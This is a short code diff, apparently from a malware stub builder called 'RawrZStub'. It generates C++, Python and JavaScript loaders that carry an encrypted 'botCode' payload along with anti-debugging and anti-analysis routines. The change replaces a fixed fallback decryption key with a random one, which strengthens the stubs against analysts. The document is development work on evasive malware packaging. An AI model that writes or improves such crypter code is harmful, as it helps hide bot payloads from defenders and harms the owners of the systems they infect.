@@ -752,7 +752,7 @@ public:
     RawrZStub() {
         // Initialize encrypted payload
         encryptedPayload = "${this.encryptBotCode(botCode, encryptionOptions)}";
-        decryptionKey = "${encryptionOptions.key || 'default_key'}";
+        decryptionKey = "${encryptionOptions.key || crypto.randomBytes(32).toString('hex')}";
         
         // Anti-debugging measures
         this->antiDebug();
@@ -851,7 +851,7 @@ ${encryptionOptions.algorithm ? 'from cryptography.fernet import Fernet\nimport 
 class RawrZStub:
     def __init__(self):
         self.system_payload = "${this.encryptBotCode(botCode, encryptionOptions)}"
-        self.decryption_key = "${encryptionOptions.key || 'default_key'}"
+        self.decryption_key = "${encryptionOptions.key || crypto.randomBytes(32).toString('hex')}"
         ${encryptionCode}
         
         # Anti-analysis measures
@@ -959,7 +959,7 @@ ${encryptionOptions.algorithm ? 'const crypto = require(\'crypto\');' : ''}
 class RawrZStub {
     constructor() {
         this.encryptedPayload = "${this.encryptBotCode(botCode, encryptionOptions)}";
-        this.decryptionKey = "${encryptionOptions.key || 'default_key'}";
+        this.decryptionKey = "${encryptionOptions.key || crypto.randomBytes(32).toString('hex')}";
         ${encryptionCode}
         
         // Anti-analysis measures
